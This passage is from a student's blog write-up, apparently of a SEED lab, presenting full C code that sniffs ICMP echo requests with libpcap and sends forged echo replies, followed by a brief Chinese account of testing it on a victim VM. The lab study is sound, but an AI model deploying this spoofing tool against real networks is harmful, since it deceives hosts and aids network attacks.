    <span class="token comment">// Enable IP_HDRINCL to manually construct IP header</span>
    <span class="token keyword">int</span> one <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">int</span> <span class="token operator">*</span>val <span class="token operator">=</span> <span class="token operator">&amp;</span>one<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> IPPROTO_IP<span class="token punctuation">,</span> IP_HDRINCL<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"setsockopt() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Set destination address (original source)</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> ip_hdr<span class="token operator">-></span>ip_src<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>
    
    <span class="token comment">// Clear packet buffer</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Construct IP Header for Reply =====</span>
    <span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span>ip_reply <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span><span class="token punctuation">)</span>packet<span class="token punctuation">;</span>
    
    ip_reply<span class="token operator">-></span>ip_v <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>                       <span class="token comment">// IPv4</span>
    ip_reply<span class="token operator">-></span>ip_hl <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>                      <span class="token comment">// Header length (5 * 4 = 20 bytes)</span>
    ip_reply<span class="token operator">-></span>ip_tos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Type of service</span>
    ip_reply<span class="token operator">-></span>ip_len <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Total length</span>
    ip_reply<span class="token operator">-></span>ip_id <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">54321</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// Identification</span>
    ip_reply<span class="token operator">-></span>ip_off <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Fragment offset</span>
    ip_reply<span class="token operator">-></span>ip_ttl <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>                    <span class="token comment">// Time to live</span>
    ip_reply<span class="token operator">-></span>ip_p <span class="token operator">=</span> IPPROTO_ICMP<span class="token punctuation">;</span>            <span class="token comment">// ICMP protocol</span>
    ip_reply<span class="token operator">-></span>ip_sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Checksum (calculate later)</span>
    
    <span class="token comment">// Swap source and destination for reply</span>
    ip_reply<span class="token operator">-></span>ip_src<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> ip_hdr<span class="token operator">-></span>ip_dst<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>  <span class="token comment">// Original destination becomes source</span>
    ip_reply<span class="token operator">-></span>ip_dst<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> ip_hdr<span class="token operator">-></span>ip_src<span class="token punctuation">.</span>s_addr<span class="token punctuation">;</span>  <span class="token comment">// Original source becomes destination</span>
    
    <span class="token comment">// Calculate IP header checksum</span>
    ip_reply<span class="token operator">-></span>ip_sum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>ip_reply<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Construct ICMP Echo Reply Header =====</span>
    <span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span>icmp_reply <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    icmp_reply<span class="token operator">-></span>type <span class="token operator">=</span> ICMP_ECHOREPLY<span class="token punctuation">;</span>        <span class="token comment">// ICMP Echo Reply</span>
    icmp_reply<span class="token operator">-></span>code <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token comment">// Code 0 for echo reply</span>
    icmp_reply<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id <span class="token operator">=</span> icmp_req<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id<span class="token punctuation">;</span>        <span class="token comment">// Same ID as request</span>
    icmp_reply<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence <span class="token operator">=</span> icmp_req<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence<span class="token punctuation">;</span> <span class="token comment">// Same sequence as request</span>
    icmp_reply<span class="token operator">-></span>checksum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                 <span class="token comment">// Will calculate later</span>
    
    <span class="token comment">// ===== Copy the data from request to reply =====</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data_req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>icmp_req <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>data_reply <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Copy 8 bytes of data (standard ping data size)</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>data_reply<span class="token punctuation">,</span> data_req<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Calculate ICMP checksum (header + data)</span>
    <span class="token keyword">int</span> icmp_total_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>
    icmp_reply<span class="token operator">-></span>checksum <span class="token operator">=</span> <span class="token function">calculate_checksum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>icmp_reply<span class="token punctuation">,</span> icmp_total_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// ===== Send the spoofed reply =====</span>
    <span class="token keyword">int</span> packet_len <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>ip_reply<span class="token operator">-></span>ip_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> packet<span class="token punctuation">,</span> packet_len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"sendto() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sent spoofed ICMP Echo Reply:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  To: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>ip_reply<span class="token operator">-></span>ip_dst<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  From: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>ip_reply<span class="token operator">-></span>ip_src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  ID: %d, Sequence: %d\n"</span><span class="token punctuation">,</span> 
               <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_reply<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span> 
               <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_reply<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">close</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Packet handler function for pcap</span>
<span class="token keyword">void</span> <span class="token function">packet_handler</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span>user<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pcap_pkthdr</span> <span class="token operator">*</span>header<span class="token punctuation">,</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>packet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span>ip_hdr<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span>icmp_hdr<span class="token punctuation">;</span>
    <span class="token keyword">int</span> ip_header_len<span class="token punctuation">;</span>
    
    <span class="token comment">// Get IP header</span>
    ip_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Skip Ethernet header (14 bytes)</span>
    ip_header_len <span class="token operator">=</span> ip_hdr<span class="token operator">-></span>ip_hl <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Check if it's ICMP protocol</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ip_hdr<span class="token operator">-></span>ip_p <span class="token operator">==</span> IPPROTO_ICMP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Get ICMP header</span>
        icmp_hdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">icmphdr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">+</span> ip_header_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// Check if it's an ICMP Echo Request</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>icmp_hdr<span class="token operator">-></span>type <span class="token operator">==</span> ICMP_ECHO<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n=== ICMP Echo Request Detected ===\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"From: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>ip_hdr<span class="token operator">-></span>ip_src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"To: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>ip_hdr<span class="token operator">-></span>ip_dst<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ID: %d, Sequence: %d\n"</span><span class="token punctuation">,</span> 
                   <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span> 
                   <span class="token function">ntohs</span><span class="token punctuation">(</span>icmp_hdr<span class="token operator">-></span>un<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>sequence<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"==================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token comment">// Send spoofed reply</span>
            <span class="token function">send_spoofed_reply</span><span class="token punctuation">(</span>ip_hdr<span class="token punctuation">,</span> icmp_hdr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">pcap_t</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>
    <span class="token keyword">char</span> errbuf<span class="token punctuation">[</span>PCAP_ERRBUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">bpf_program</span> fp<span class="token punctuation">;</span>
    <span class="token keyword">char</span> filter_exp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"icmp"</span><span class="token punctuation">;</span>
    bpf_u_int32 net<span class="token punctuation">;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Starting ICMP Sniff-and-Spoof Program...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This program will:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Sniff for ICMP Echo Requests on the network\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Automatically send spoofed ICMP Echo Replies\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Make ping programs believe any IP is alive\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Press Ctrl+C to stop\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Set up signal handler for graceful exit</span>
    <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> handle_signal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">signal</span><span class="token punctuation">(</span>SIGTERM<span class="token punctuation">,</span> handle_signal<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Open network interface for packet capture</span>
    handle <span class="token operator">=</span> <span class="token function">pcap_open_live</span><span class="token punctuation">(</span><span class="token string">"eth0"</span><span class="token punctuation">,</span> BUFSIZ<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open device eth0: %s\n"</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Trying enp0s3...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        handle <span class="token operator">=</span> <span class="token function">pcap_open_live</span><span class="token punctuation">(</span><span class="token string">"enp0s3"</span><span class="token punctuation">,</span> BUFSIZ<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open device enp0s3: %s\n"</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Available devices:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token comment">// List available devices</span>
            <span class="token class-name">pcap_if_t</span> <span class="token operator">*</span>alldevs<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_findalldevs</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>alldevs<span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Error finding devices: %s\n"</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">pcap_if_t</span> <span class="token operator">*</span>d <span class="token operator">=</span> alldevs<span class="token punctuation">;</span> d <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> d <span class="token operator">=</span> d<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  %s"</span><span class="token punctuation">,</span> d<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token operator">-></span>description<span class="token punctuation">)</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" (%s)\n"</span><span class="token punctuation">,</span> d<span class="token operator">-></span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">else</span>
                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" (No description available)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">pcap_freealldevs</span><span class="token punctuation">(</span>alldevs<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Compile and set filter for ICMP packets only</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_compile</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> net<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't parse filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_setfilter</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't install filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sniffing for ICMP Echo Requests...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// Start packet capture loop</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stop<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">pcap_dispatch</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> packet_handler<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Cleanup</span>
    <span class="token function">pcap_close</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sniff-and-spoof program stopped.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先让受害者主机ping真实存在的地址，再ping不存在的地址。</p>
<p>可以发现程序检测到了报文，并伪造了报文返回，受害者主机检测到有重复报文。</p>
<p><img src="/2025/11/12/seedlab6/image-20251118001012400.png" alt="image-20251118001012400"></p>
<p>但是ping一个不存在的IP的时候，可能是由于IP地址进行了转换，并没有欺骗到受害者主机。</p>
<p><img src="/2025/11/12/seedlab6/image-20251118001502125.png" alt="image-20251118001502125"></p>
<p><img src="/2025/11/12/seedlab6/image-20251118001850618.png" alt="image-20251118001850618"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个实验用了两种方法。一种是基于python使用scapy库，一种是c使用pcap库，python的方式更简单也更直观，c语言的方式效率更高，但是写代码较为复杂。通过实验我对比较熟悉了scapy库的使用，但是对pcap的使用不太熟悉，上面的c语言代码都是使用大语言模型完成。同时对操作系统的网络管理和网口管理不太熟悉，上面有些实验的结果并不在我的意料之中，例如地址转换。不过在实验中清楚地了解了，这种网络攻击是如何去展开的，以及原理是如何实现的。</p>

  </div>
  <div id=""></div>
</div>

<script>
  
Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
  dragToClose: true,
  Toolbar: true,
  closeButton: "top",
  Image: {
    zoom: true,
  },
  on: {
    initCarousel: (fancybox) => {
      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
      fancybox.$container.style.setProperty(
        "--bg-image",
        `url("${slide.$thumb.src}")`
      );
    },
    "Carousel.change": (fancybox, carousel, to, from) => {
      const slide = carousel.slides[to];
      fancybox.$container.style.setProperty(
        "--bg-image",
        `url("${slide.$thumb.src}")`
      );
    },
  },
});
</script>

<style>
    #noneimg img {
        display: none;
        z-index: 9999;
        /* width: 600px !important; */
        min-width: 0%;
        max-width: 90%;
        max-height: 80%;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            max-width: 88%
        }
    }
</style>

    <div class="post-paging">
    
    <a href="/2025/11/19/seedlab7/">
        <div class="post-paging-last">
            <span>上一篇</span>
            <p>TCP/IP Attack Lab</p>
        </div>
    </a>
    

    
    <a href="/2025/11/06/seedlab5/">
        <div class="post-paging-next">
            <span>下一篇</span>
            <p>Format String Attack Lab</p>
        </div>
    </a>
    
</div>
</div>
		
<div class="footer">
	<div class="Copyright">
		©2025 By Ram. 主题：<a
